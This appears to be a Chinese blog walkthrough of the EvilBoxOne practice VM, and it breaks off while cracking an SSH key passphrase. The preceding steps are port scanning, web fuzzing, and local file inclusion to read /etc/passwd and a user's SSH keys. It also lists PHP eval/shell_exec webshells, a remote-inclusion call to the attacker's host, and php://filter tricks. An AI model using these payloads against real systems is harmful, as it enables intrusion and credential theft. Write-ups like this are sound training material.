<figure class="highlight accesslog"><table><tr><td class="code"><pre><span class="line">fping -gaq <span class="number">172</span>.<span class="number">16</span>.<span class="number">42</span>.<span class="number">0</span>/<span class="number">24</span></span><br><span class="line"></span><br><span class="line"><span class="number">172.16.42.1</span></span><br><span class="line"><span class="number">172.16.42.147</span></span><br><span class="line"><span class="number">172.16.42.206</span></span><br><span class="line"></span><br><span class="line">确认主机<span class="number">172</span>.<span class="number">16</span>.<span class="number">42</span>.<span class="number">206</span></span><br></pre></td></tr></table></figure>



<p>nmap全端口扫描</p>
<figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line">sudo nmap -p- <span class="number">172.16</span><span class="number">.42</span><span class="number">.206</span></span><br><span class="line"></span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line"><span class="number">22</span>/tcp <span class="built_in">open</span>  ssh</span><br><span class="line"><span class="number">80</span>/tcp <span class="built_in">open</span>  <span class="keyword">http</span></span><br></pre></td></tr></table></figure>



<p>服务识别</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">sudo</span> nmap -p<span class="number">22</span>,<span class="number">80</span> -A <span class="number">172.16.42.206</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">PORT</span>   STATE SERVICE VERSION</span><br><span class="line"><span class="attribute">22</span>/tcp open  ssh     OpenSSH <span class="number">7</span>.<span class="number">9</span>p<span class="number">1</span> Debian <span class="number">10</span>+deb<span class="number">10</span>u<span class="number">2</span> (protocol <span class="number">2</span>.<span class="number">0</span>)</span><br><span class="line"><span class="attribute">80</span>/tcp open  http    Apache httpd <span class="number">2</span>.<span class="number">4</span>.<span class="number">38</span> ((Debian))</span><br></pre></td></tr></table></figure>





<h2 id="web入侵"><a href="#web入侵" class="headerlink" title="web入侵"></a>web入侵</h2><h3 id="gobuster目录扫描"><a href="#gobuster目录扫描" class="headerlink" title="gobuster目录扫描"></a>gobuster目录扫描</h3><p>使用seclists字典</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">gobuster dir -u http:<span class="regexp">//</span><span class="number">172.16</span>.<span class="number">42.206</span><span class="regexp">/ -w /u</span>sr<span class="regexp">/share/</span>seclists<span class="regexp">/Discovery/</span>Web-Content/directory-list-<span class="number">1.0</span>.txt -x txt,php,html,jsp</span><br></pre></td></tr></table></figure>

<p>发现secret目录，继续在secret目录下目录爆破</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">gobuster dir -u http:<span class="regexp">//</span><span class="number">172.16</span>.<span class="number">42.206</span><span class="regexp">/secret -w /u</span>sr<span class="regexp">/share/</span>seclists<span class="regexp">/Discovery/</span>Web-Content/directory-list-<span class="number">1.0</span>.txt -x txt,php,html,jsp</span><br></pre></td></tr></table></figure>



<h3 id="参数fuzz"><a href="#参数fuzz" class="headerlink" title="参数fuzz"></a>参数fuzz</h3><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">ffuf -w <span class="regexp">/usr/</span>share<span class="regexp">/seclists/</span>Discovery<span class="regexp">/Web-Content/</span>burp-parameter-names.txt:PARAM -w ~<span class="regexp">/pentest/</span>wordlist<span class="regexp">/shadowflow/</span>para-value.txt:VAL -u http:<span class="regexp">//</span><span class="number">172.16</span>.<span class="number">42.206</span><span class="regexp">/secret/</span>evil.php\?PARAM\=VAL -fs <span class="number">0</span></span><br></pre></td></tr></table></figure>

<p>未发现可用参数</p>
<h3 id="测试文件包含"><a href="#测试文件包含" class="headerlink" title="测试文件包含"></a>测试文件包含</h3><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">ffuf -w <span class="regexp">/usr/</span>share<span class="regexp">/seclists/</span>Discovery<span class="regexp">/Web-Content/</span>burp-parameter-names.txt -u http:<span class="regexp">//</span><span class="number">172.16</span>.<span class="number">42.206</span><span class="regexp">/secret/</span>evil.php\?FUZZ=../index.html -fs <span class="number">0</span></span><br></pre></td></tr></table></figure>

<p>fuzz出了command，任意文件读取</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/172.16.42.206/secret</span><span class="regexp">/evil.php?command=../</span>../../../../../../../etc/passwd</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="symbol">root:</span><span class="symbol">x:</span><span class="number">0</span><span class="symbol">:</span><span class="number">0</span><span class="symbol">:root</span><span class="symbol">:/root</span><span class="symbol">:/bin/bash</span> <span class="symbol">daemon:</span><span class="symbol">x:</span><span class="number">1</span><span class="symbol">:</span><span class="number">1</span><span class="symbol">:daemon</span><span class="symbol">:/usr/sbin</span><span class="symbol">:/usr/sbin/nologin</span> <span class="symbol">bin:</span><span class="symbol">x:</span><span class="number">2</span><span class="symbol">:</span><span class="number">2</span><span class="symbol">:bin</span><span class="symbol">:/bin</span><span class="symbol">:/usr/sbin/nologin</span> <span class="symbol">sys:</span><span class="symbol">x:</span><span class="number">3</span><span class="symbol">:</span><span class="number">3</span><span class="symbol">:sys</span><span class="symbol">:/dev</span><span class="symbol">:/usr/sbin/nologin</span> <span class="symbol">sync:</span><span class="symbol">x:</span><span class="number">4</span><span class="symbol">:</span><span class="number">65534</span><span class="symbol">:sync</span><span class="symbol">:/bin</span><span class="symbol">:/bin/sync</span> <span class="symbol">games:</span><span class="symbol">x:</span><span class="number">5</span><span class="symbol">:</span><span class="number">60</span><span class="symbol">:games</span><span class="symbol">:/usr/games</span><span class="symbol">:/usr/sbin/nologin</span> <span class="symbol">man:</span><span class="symbol">x:</span><span class="number">6</span><span class="symbol">:</span><span class="number">12</span><span class="symbol">:man</span><span class="symbol">:/var/cache/man</span><span class="symbol">:/usr/sbin/nologin</span> <span class="symbol">lp:</span><span class="symbol">x:</span><span class="number">7</span><span class="symbol">:</span><span class="number">7</span><span class="symbol">:lp</span><span class="symbol">:/var/spool/lpd</span><span class="symbol">:/usr/sbin/nologin</span> <span class="symbol">mail:</span><span class="symbol">x:</span><span class="number">8</span><span class="symbol">:</span><span class="number">8</span><span class="symbol">:mail</span><span class="symbol">:/var/mail</span><span class="symbol">:/usr/sbin/nologin</span> <span class="symbol">news:</span><span class="symbol">x:</span><span class="number">9</span><span class="symbol">:</span><span class="number">9</span><span class="symbol">:news</span><span class="symbol">:/var/spool/news</span><span class="symbol">:/usr/sbin/nologin</span> <span class="symbol">uucp:</span><span class="symbol">x:</span><span class="number">10</span><span class="symbol">:</span><span class="number">10</span><span class="symbol">:uucp</span><span class="symbol">:/var/spool/uucp</span><span class="symbol">:/usr/sbin/nologin</span> <span class="symbol">proxy:</span><span class="symbol">x:</span><span class="number">13</span><span class="symbol">:</span><span class="number">13</span><span class="symbol">:proxy</span><span class="symbol">:/bin</span><span class="symbol">:/usr/sbin/nologin</span> www-<span class="symbol">data:</span><span class="symbol">x:</span><span class="number">33</span><span class="symbol">:</span><span class="number">33</span><span class="symbol">:www-data</span><span class="symbol">:/var/www</span><span class="symbol">:/usr/sbin/nologin</span> <span class="symbol">backup:</span><span class="symbol">x:</span><span class="number">34</span><span class="symbol">:</span><span class="number">34</span><span class="symbol">:backup</span><span class="symbol">:/var/backups</span><span class="symbol">:/usr/sbin/nologin</span> <span class="symbol">list:</span><span class="symbol">x:</span><span class="number">38</span><span class="symbol">:</span><span class="number">38</span><span class="symbol">:Mailing</span> List <span class="symbol">Manager:</span>/var/<span class="symbol">list:</span>/usr/sbin/nologin <span class="symbol">irc:</span><span class="symbol">x:</span><span class="number">39</span><span class="symbol">:</span><span class="number">39</span><span class="symbol">:ircd</span><span class="symbol">:/var/run/ircd</span><span class="symbol">:/usr/sbin/nologin</span> <span class="symbol">gnats:</span><span class="symbol">x:</span><span class="number">41</span><span class="symbol">:</span><span class="number">41</span><span class="symbol">:Gnats</span> Bug-Reporting System (admin)<span class="symbol">:/var/lib/gnats</span><span class="symbol">:/usr/sbin/nologin</span> <span class="symbol">nobody:</span><span class="symbol">x:</span><span class="number">65534</span><span class="symbol">:</span><span class="number">65534</span><span class="symbol">:nobody</span><span class="symbol">:/nonexistent</span><span class="symbol">:/usr/sbin/nologin</span> <span class="symbol">_apt:</span><span class="symbol">x:</span><span class="number">100</span><span class="symbol">:</span><span class="number">65534</span><span class="symbol">:</span><span class="symbol">:/nonexistent</span><span class="symbol">:/usr/sbin/nologin</span> systemd-<span class="symbol">timesync:</span><span class="symbol">x:</span><span class="number">101</span><span class="symbol">:</span><span class="number">102</span><span class="symbol">:systemd</span> Time Synchronization,,,<span class="symbol">:/run/systemd</span><span class="symbol">:/usr/sbin/nologin</span> systemd-<span class="symbol">network:</span><span class="symbol">x:</span><span class="number">102</span><span class="symbol">:</span><span class="number">103</span><span class="symbol">:systemd</span> Network Management,,,<span class="symbol">:/run/systemd</span><span class="symbol">:/usr/sbin/nologin</span> systemd-<span class="symbol">resolve:</span><span class="symbol">x:</span><span class="number">103</span><span class="symbol">:</span><span class="number">104</span><span class="symbol">:systemd</span> Resolver,,,<span class="symbol">:/run/systemd</span><span class="symbol">:/usr/sbin/nologin</span> <span class="symbol">messagebus:</span><span class="symbol">x:</span><span class="number">104</span><span class="symbol">:</span><span class="number">110</span><span class="symbol">:</span><span class="symbol">:/nonexistent</span><span class="symbol">:/usr/sbin/nologin</span> <span class="symbol">sshd:</span><span class="symbol">x:</span><span class="number">105</span><span class="symbol">:</span><span class="number">65534</span><span class="symbol">:</span><span class="symbol">:/run/sshd</span><span class="symbol">:/usr/sbin/nologin</span> <span class="symbol">mowree:</span><span class="symbol">x:</span><span class="number">1000</span><span class="symbol">:</span><span class="number">1000</span><span class="symbol">:mowree</span>,,,<span class="symbol">:/home/mowree</span><span class="symbol">:/bin/bash</span> systemd-<span class="symbol">coredump:</span><span class="symbol">x:</span><span class="number">999</span><span class="symbol">:</span><span class="number">999</span><span class="symbol">:systemd</span> Core <span class="symbol">Dumper:</span>/<span class="symbol">:/usr/sbin/nologin</span></span><br></pre></td></tr></table></figure>



<h3 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h3><p>自己kali放入一句话木马</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pass&#x27;</span>]);<span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;123&#x27;</span>])<span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;123&#x27;</span>]);<span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="variable">$var</span>=shell_exec(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]); <span class="keyword">echo</span> <span class="variable">$var</span> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>我这里使用<code>&lt;?php $var=shell_exec($_GET[&#39;cmd&#39;]); echo $var ?&gt;</code></p>
<p><code>http://172.16.42.206/secret/evil.php?command=http://172.16.42.147/a.php?cmd=id</code>，失败</p>
<h3 id="php封装器"><a href="#php封装器" class="headerlink" title="php封装器"></a>php封装器</h3><p>默认包含了很多封装器/协议，比如php 、file、ftp、data、zip等。</p>
<p>通过php封装器读取源码</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">172.16</span>.<span class="number">42.206</span><span class="regexp">/secret/</span>evil.php?command=php:<span class="regexp">//</span>filter<span class="regexp">/convert.base64-encode/</span>resource=evil.php</span><br></pre></td></tr></table></figure>

<p>结果</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">PD9waHAKICAgICRmaWxlbmFtZSA9ICRfR0VUWydjb21tYW5kJ107CiAgICBpbmNsdWRlKCRmaWxlbmFtZSk7Cj8+<span class="attribute">Cg</span>==</span><br></pre></td></tr></table></figure>

<p>解码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;command&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$filename</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>尝试写入php文件</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">[root@kali html]<span class="comment"># echo -n 123 | base64</span></span><br><span class="line">MTIz</span><br><span class="line"></span><br><span class="line"><span class="comment">#发起http请求写入</span></span><br><span class="line">http:<span class="regexp">//</span><span class="number">172.16</span>.<span class="number">42.206</span><span class="regexp">/secret/</span>evil.php?command=php:<span class="regexp">//</span>filter<span class="regexp">/write=convert.base64-decode/</span>resource=test.php&amp;txt=MTIz</span><br><span class="line"></span><br><span class="line"><span class="comment">#读取</span></span><br><span class="line">http:<span class="regexp">//</span><span class="number">172.16</span>.<span class="number">42.206</span><span class="regexp">/secret/</span>evil.php?command=php:<span class="regexp">//</span>filter<span class="regexp">/convert.base64-encode/</span>resource=test.php</span><br><span class="line"></span><br><span class="line"><span class="comment">#并没有读取到，说明不成功。</span></span><br></pre></td></tr></table></figure>



<h3 id="ssh秘钥获取"><a href="#ssh秘钥获取" class="headerlink" title="ssh秘钥获取"></a>ssh秘钥获取</h3><p>通过读取/etc/passwd文件，发现有mowree用户。</p>
<p>ssh登录尝试，-v参数收集认证信息<code>ssh mowree@172.16.42.206 -v</code></p>
<figure class="highlight vbnet"><table><tr><td class="code"><pre><span class="line">[root@kali html]# ssh mowree@<span class="number">172.16</span>.<span class="number">42.206</span> -v</span><br><span class="line">OpenSSH_8.<span class="number">4</span>p1 Debian-<span class="number">6</span>, OpenSSL <span class="number">1.1</span>.<span class="number">1i</span>  <span class="number">8</span> Dec <span class="number">2020</span></span><br><span class="line"><span class="symbol">debug1:</span> Reading configuration data /etc/ssh/ssh_config</span><br><span class="line"><span class="symbol">debug1:</span> /etc/ssh/ssh_config line <span class="number">19</span>: Applying options <span class="keyword">for</span> *</span><br><span class="line"><span class="symbol">debug1:</span> Connecting <span class="keyword">to</span> <span class="number">172.16</span>.<span class="number">42.206</span> [<span class="number">172.16</span>.<span class="number">42.206</span>] port <span class="number">22</span>.</span><br><span class="line"><span class="symbol">debug1:</span> Connection established.</span><br><span class="line"><span class="symbol">debug1:</span> identity file /root/.ssh/id_rsa type -<span class="number">1</span></span><br><span class="line"><span class="symbol">debug1:</span> identity file /root/.ssh/id_rsa-cert type -<span class="number">1</span></span><br><span class="line"><span class="symbol">debug1:</span> identity file /root/.ssh/id_dsa type -<span class="number">1</span></span><br><span class="line"><span class="symbol">debug1:</span> identity file /root/.ssh/id_dsa-cert type -<span class="number">1</span></span><br><span class="line"><span class="symbol">debug1:</span> identity file /root/.ssh/id_ecdsa type -<span class="number">1</span></span><br><span class="line"><span class="symbol">debug1:</span> identity file /root/.ssh/id_ecdsa-cert type -<span class="number">1</span></span><br><span class="line"><span class="symbol">debug1:</span> identity file /root/.ssh/id_ecdsa_sk type -<span class="number">1</span></span><br><span class="line"><span class="symbol">debug1:</span> identity file /root/.ssh/id_ecdsa_sk-cert type -<span class="number">1</span></span><br><span class="line"><span class="symbol">debug1:</span> identity file /root/.ssh/id_ed25519 type -<span class="number">1</span></span><br><span class="line"><span class="symbol">debug1:</span> identity file /root/.ssh/id_ed25519-cert type -<span class="number">1</span></span><br><span class="line"><span class="symbol">debug1:</span> identity file /root/.ssh/id_ed25519_sk type -<span class="number">1</span></span><br><span class="line"><span class="symbol">debug1:</span> identity file /root/.ssh/id_ed25519_sk-cert type -<span class="number">1</span></span><br><span class="line"><span class="symbol">debug1:</span> identity file /root/.ssh/id_xmss type -<span class="number">1</span></span><br><span class="line"><span class="symbol">debug1:</span> identity file /root/.ssh/id_xmss-cert type -<span class="number">1</span></span><br><span class="line"><span class="symbol">debug1:</span> Local version <span class="type">string</span> SSH-<span class="number">2.0</span>-OpenSSH_8.<span class="number">4</span>p1 Debian-<span class="number">6</span></span><br><span class="line"><span class="symbol">debug1:</span> Remote protocol version <span class="number">2.0</span>, remote software version OpenSSH_7.<span class="number">9</span>p1 Debian-<span class="number">10</span>+deb10u2</span><br><span class="line"><span class="symbol">debug1:</span> match: OpenSSH_7.<span class="number">9</span>p1 Debian-<span class="number">10</span>+deb10u2 pat OpenSSH* compat <span class="number">0</span>x04000000</span><br><span class="line"><span class="symbol">debug1:</span> Authenticating <span class="keyword">to</span> <span class="number">172.16</span>.<span class="number">42.206</span>:<span class="number">22</span> <span class="keyword">as</span> <span class="comment">&#x27;mowree&#x27;</span></span><br><span class="line"><span class="symbol">debug1:</span> SSH2_MSG_KEXINIT sent</span><br><span class="line"><span class="symbol">debug1:</span> SSH2_MSG_KEXINIT received</span><br><span class="line"><span class="symbol">debug1:</span> kex: algorithm: curve25519-sha256</span><br><span class="line"><span class="symbol">debug1:</span> kex: host <span class="keyword">key</span> algorithm: ecdsa-sha2-nistp256</span><br><span class="line"><span class="symbol">debug1:</span> kex: server-&gt;client cipher: chacha20-poly1305@openssh.com MAC: &lt;implicit&gt; compression: none</span><br><span class="line"><span class="symbol">debug1:</span> kex: client-&gt;server cipher: chacha20-poly1305@openssh.com MAC: &lt;implicit&gt; compression: none</span><br><span class="line"><span class="symbol">debug1:</span> expecting SSH2_MSG_KEX_ECDH_REPLY</span><br><span class="line"><span class="symbol">debug1:</span> Server host <span class="keyword">key</span>: ecdsa-sha2-nistp256 SHA256:cd9WCNmPY0i3zsZaPEV0qa7yp5hz8+TVNalFULd5CwM</span><br><span class="line"><span class="symbol">debug1:</span> Host <span class="comment">&#x27;172.16.42.206&#x27; is known and matches the ECDSA host key.</span></span><br><span class="line"><span class="symbol">debug1:</span> Found <span class="keyword">key</span> <span class="keyword">in</span> /root/.ssh/known_hosts:<span class="number">4</span></span><br><span class="line"><span class="symbol">debug1:</span> rekey out after <span class="number">134217728</span> blocks</span><br><span class="line"><span class="symbol">debug1:</span> SSH2_MSG_NEWKEYS sent</span><br><span class="line"><span class="symbol">debug1:</span> expecting SSH2_MSG_NEWKEYS</span><br><span class="line"><span class="symbol">debug1:</span> SSH2_MSG_NEWKEYS received</span><br><span class="line"><span class="symbol">debug1:</span> rekey <span class="keyword">in</span> after <span class="number">134217728</span> blocks</span><br><span class="line"><span class="symbol">debug1:</span> Will attempt <span class="keyword">key</span>: /root/.ssh/id_rsa</span><br><span class="line"><span class="symbol">debug1:</span> Will attempt <span class="keyword">key</span>: /root/.ssh/id_dsa</span><br><span class="line"><span class="symbol">debug1:</span> Will attempt <span class="keyword">key</span>: /root/.ssh/id_ecdsa</span><br><span class="line"><span class="symbol">debug1:</span> Will attempt <span class="keyword">key</span>: /root/.ssh/id_ecdsa_sk</span><br><span class="line"><span class="symbol">debug1:</span> Will attempt <span class="keyword">key</span>: /root/.ssh/id_ed25519</span><br><span class="line"><span class="symbol">debug1:</span> Will attempt <span class="keyword">key</span>: /root/.ssh/id_ed25519_sk</span><br><span class="line"><span class="symbol">debug1:</span> Will attempt <span class="keyword">key</span>: /root/.ssh/id_xmss</span><br><span class="line"><span class="symbol">debug1:</span> SSH2_MSG_EXT_INFO received</span><br><span class="line"><span class="symbol">debug1:</span> kex_input_ext_info: server-sig-algs=&lt;ssh-ed25519,ssh-rsa,rsa-sha2-<span class="number">256</span>,rsa-sha2-<span class="number">512</span>,ssh-dss,ecdsa-sha2-nistp256,ecdsa-sha2-nistp384,ecdsa-sha2-nistp521&gt;</span><br><span class="line"><span class="symbol">debug1:</span> SSH2_MSG_SERVICE_ACCEPT received</span><br><span class="line"><span class="symbol">debug1:</span> Authentications that can <span class="keyword">continue</span>: publickey,password</span><br><span class="line"><span class="symbol">debug1:</span> <span class="keyword">Next</span> authentication method: publickey</span><br><span class="line"><span class="symbol">debug1:</span> Trying <span class="keyword">private</span> <span class="keyword">key</span>: /root/.ssh/id_rsa</span><br><span class="line"><span class="symbol">debug1:</span> Trying <span class="keyword">private</span> <span class="keyword">key</span>: /root/.ssh/id_dsa</span><br><span class="line"><span class="symbol">debug1:</span> Trying <span class="keyword">private</span> <span class="keyword">key</span>: /root/.ssh/id_ecdsa</span><br><span class="line"><span class="symbol">debug1:</span> Trying <span class="keyword">private</span> <span class="keyword">key</span>: /root/.ssh/id_ecdsa_sk</span><br><span class="line"><span class="symbol">debug1:</span> Trying <span class="keyword">private</span> <span class="keyword">key</span>: /root/.ssh/id_ed25519</span><br><span class="line"><span class="symbol">debug1:</span> Trying <span class="keyword">private</span> <span class="keyword">key</span>: /root/.ssh/id_ed25519_sk</span><br><span class="line"><span class="symbol">debug1:</span> Trying <span class="keyword">private</span> <span class="keyword">key</span>: /root/.ssh/id_xmss</span><br><span class="line"><span class="symbol">debug1:</span> <span class="keyword">Next</span> authentication method: password</span><br></pre></td></tr></table></figure>

<p>其中<code>debug1: Authentications that can continue: publickey,password</code>表示可以通过秘钥或者密码认证。</p>
<p>读取公钥</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">172.16</span>.<span class="number">42.206</span><span class="regexp">/secret/</span>evil.php?command=..<span class="regexp">/../</span>..<span class="regexp">/../</span>home<span class="regexp">/mowree/</span>.ssh/authorized_keys</span><br></pre></td></tr></table></figure>

<p>结果</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">ssh</span>-rsa AAAAB<span class="number">3</span>NzaC<span class="number">1</span>yc<span class="number">2</span>EAAAADAQABAAABAQDAXfEfC<span class="number">22</span>Bpq<span class="number">40</span>UDZ<span class="number">8</span>QXeuQa<span class="number">6</span>EVJPmW<span class="number">6</span>BjB<span class="number">4</span>Ud/knShqQ<span class="number">86</span>qCUatKaNlMfdpzKaagEBtlVUYwit<span class="number">68</span>VH<span class="number">5</span>xHV/QIcAzWi+FNw<span class="number">0</span>SB<span class="number">2</span>KTYvS<span class="number">514</span>pkYj<span class="number">2</span>mqrONdu<span class="number">1</span>LQLvgXIqbmV<span class="number">7</span>MPyE<span class="number">2</span>AsGoQrOftpLKLJ<span class="number">8</span>JToaIUCgYsVPHvs<span class="number">9</span>Jy<span class="number">3</span>fka+qLRHb<span class="number">0</span>HjekPOuMiq<span class="number">19</span>OeBeuGViaqILY+w<span class="number">9</span>h<span class="number">19</span>ebZelN<span class="number">8</span>fJKW<span class="number">3</span>mX<span class="number">4</span>mkpM<span class="number">7</span>eH<span class="number">4</span>C<span class="number">46</span>J<span class="number">0</span>cmbK<span class="number">3</span>ztkZuQ<span class="number">9</span>e<span class="number">8</span>Z<span class="number">14</span>yAhcehde+sEHFKVcPS<span class="number">0</span>WkHl<span class="number">61</span>aTQoH/XTky<span class="number">8</span>dHatCUucUATnwjDvUMgrVZ<span class="number">5</span>cTjr<span class="number">4</span>Q<span class="number">4</span>YSvSRSIgpDP<span class="number">2</span>lNNs<span class="number">1</span>B<span class="number">7</span> mowree@EvilBoxOne</span><br></pre></td></tr></table></figure>

<p>可以看见是rsa算法，于是可以读取私钥</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">172.16</span>.<span class="number">42.206</span><span class="regexp">/secret/</span>evil.php?command=..<span class="regexp">/../</span>..<span class="regexp">/../</span>home<span class="regexp">/mowree/</span>.ssh/id_rsa</span><br></pre></td></tr></table></figure>

<p>私钥结果</p>
<p><code>view-source:http://172.16.42.206/secret/evil.php?command=../../../../home/mowree/.ssh/id_rsa</code></p>
<p>查看源码方式读取比较友好</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-----BEGIN RSA PRIVATE KEY-----</span></span><br><span class="line">Proc-<span class="keyword">Type</span>: <span class="number">4</span>,<span class="keyword">ENCRYPTED</span></span><br><span class="line">DEK-<span class="keyword">Info</span>: DES-EDE3-CBC,<span class="number">9</span>FB14B3F3D04E90E</span><br><span class="line"></span><br><span class="line">uuQm2CFIe/eZT5pNyQ6+K1Uap/FYWcsEklzONt+x4AO6FmjFmR8RUpwMHurmbRC6</span><br><span class="line">hqyoiv8vgpQgQRPYMzJ3QgS9kUCGdgC5+cXlNCST/GKQOS4QMQMUTacjZZ8EJzoe</span><br><span class="line">o7+<span class="number">7</span>tCB8Zk/sW7b8c3m4Cz0CmE5mut8ZyuTnB0SAlGAQfZjqsldugHjZ1t17mldb</span><br><span class="line">+gzWGBUmKTOLO/gcuAZC+Tj+BoGkb2gneiMA85oJX6y/dqq4Ir10Qom+<span class="number">0</span>tOFsuot</span><br><span class="line">b7A9XTubgElslUEm8fGW64kX3x3LtXRsoR12n+krZ6T+IOTzThMWExR1Wxp4Ub/k</span><br><span class="line">HtXTzdvDQBbgBf4h08qyCOxGEaVZHKaV/ynGnOv0zhlZ+z163SjppVPK07H4bdLg</span><br><span class="line"><span class="number">9</span>SC1omYunvJgunMS0ATC8uAWzoQ5Iz5ka0h+NOofUrVtfJZ/OnhtMKW+M948EgnY</span><br><span class="line">zh7Ffq1KlMjZHxnIS3bdcl4MFV0F3Hpx+iDukvyfeeWKuoeUuvzNfVKVPZKqyaJu</span><br><span class="line">rRqnxYW/fzdJm+<span class="number">8</span>XViMQccgQAaZ+Zb2rVW0gyifsEigxShdaT5PGdJFKKVLS+bD1</span><br><span class="line">tHBy6UOhKCn3H8edtXwvZN+<span class="number">9</span>PDGDzUcEpr9xYCLkmH+hcr06ypUtlu9UrePLh/Xs</span><br><span class="line"><span class="number">94</span>KATK4joOIW7O8GnPdKBiI+<span class="number">3</span>Hk0qakL1kyYQVBtMjKTyEM8yRcssGZr/MdVnYWm</span><br><span class="line">VD5pEdAybKBfBG/xVu2CR378BRKzlJkiyqRjXQLoFMVDz3I30RpjbpfYQs2Dm2M7</span><br><span class="line">Mb26wNQW4ff7qe30K/Ixrm7MfkJPzueQlSi94IHXaPvl4vyCoPLW89JzsNDsvG8P</span><br><span class="line">hrkWRpPIwpzKdtMPwQbkPu4ykqgKkYYRmVlfX8oeis3C1hCjqvp3Lth0QDI+<span class="number">7</span>Shr</span><br><span class="line">Fb5w0n0qfDT4o03U1Pun2iqdI4M+iDZUF4S0BD3xA/zp+d98NnGlRqMmJK+StmqR</span><br><span class="line">IIk3DRRkvMxxCm12g2DotRUgT2+mgaZ3nq55eqzXRh0U1P5QfhO+V8WzbVzhP6+R</span><br><span class="line">MtqgW1L0iAgB4CnTIud6DpXQtR9l//<span class="number">9</span>alrXa+<span class="number">4</span>nWcDW2GoKjljxOKNK8jXs58SnS</span><br><span class="line"><span class="number">62</span>LrvcNZVokZjql8Xi7xL0XbEk0gtpItLtX7xAHLFTVZt4UH6csOcwq5vvJAGh69</span><br><span class="line">Q/ikz5XmyQ+wDwQEQDzNeOj9zBh1+<span class="number">1</span>zrdmt0m7hI5WnIJakEM2vqCqluN5CEs4u8</span><br><span class="line">p1ia+meL0JVlLobfnUgxi3Qzm9SF2pifQdePVU4GXGhIOBUf34bts0iEIDf+qx2C</span><br><span class="line">pwxoAe1tMmInlZfR2sKVlIeHIBfHq/hPf2PHvU0cpz7MzfY36x9ufZc5MH2JDT8X</span><br><span class="line">KREAJ3S0pMplP/ZcXjRLOlESQXeUQ2yvb61m+zphg0QjWH131gnaBIhVIj1nLnTa</span><br><span class="line">i99+vYdwe8+<span class="number">8</span>nJq4/WXhkN+VTYXndET2H0fFNTFAqbk2HGy6+<span class="number">6</span>qS/<span class="number">4</span>Q6DVVxTHdp</span><br><span class="line"><span class="number">4</span>Dg2QRnRTjp74dQ1NZ7juucvW7DBFE+CK80dkrr9yFyybVUqBwHrmmQVFGLkS2I/</span><br><span class="line"><span class="number">8</span>kOVjIjFKkGQ4rNRWKVoo/HaRoI/f2G6tbEiOVclUMT8iutAg8S4VA==</span><br><span class="line"><span class="comment">-----END RSA PRIVATE KEY-----</span></span><br></pre></td></tr></table></figure>



<p>私钥登录:  创建一个id_rsa文件</p>
<figure class="highlight autoit"><table><tr><td class="code"><pre><span class="line">[root<span class="symbol">@kali</span> /tmp]<span class="meta"># vi id_rsa</span></span><br><span class="line">[root<span class="symbol">@kali</span> /tmp]<span class="meta"># chmod 600 id_rsa</span></span><br><span class="line">[root<span class="symbol">@kali</span> /tmp]<span class="meta"># ssh mowree@172.16.42.206 -i ./id_rsa</span></span><br></pre></td></tr></table></figure>

<p>登录发现要输入key</p>
<figure class="highlight autoit"><table><tr><td class="code"><pre><span class="line">[root<span class="symbol">@kali</span> /tmp]<span class="meta"># ssh mowree@172.16.42.206 -i ./id_rsa</span></span><br><span class="line">Enter passphrase <span class="keyword">for</span> key <span class="string">&#x27;./id_rsa&#x27;</span>:</span><br></pre></td></tr></table></figure>

<p>访问私钥也需要认证。</p>
<p>这时候需要本地密码破解</p>
<h3 id="ssh爆破"><a href="#ssh爆破" class="headerlink" title="ssh爆破"></a>ssh爆破</h3><ul>
<li><p>将id_rsa转为john可识别格式。</p>
<figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line">[root@kali john]# cd <span class="regexp">/usr/</span>share/john</span><br><span class="line">[root@kali john]# .<span class="regexp">/ssh2john.py /</span>tmp<span class="regexp">/id_rsa &gt; /</span>tmp/hash</span><br></pre></td></tr></table></figure></li>
<li><p>生成字典</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">[root@kali <span class="regexp">/tmp]# cp /u</span>sr<span class="regexp">/share/</span>wordlists<span class="regexp">/rockyou.txt.gz ./</span></span><br><span class="line">[root@kali /tmp]<span class="comment"># gunzip rockyou.txt.gz</span></span><br></pre></td></tr></table></figure></li>
<li><p>开始爆破<code>john hash --wordlist=rockyou.txt</code></p>
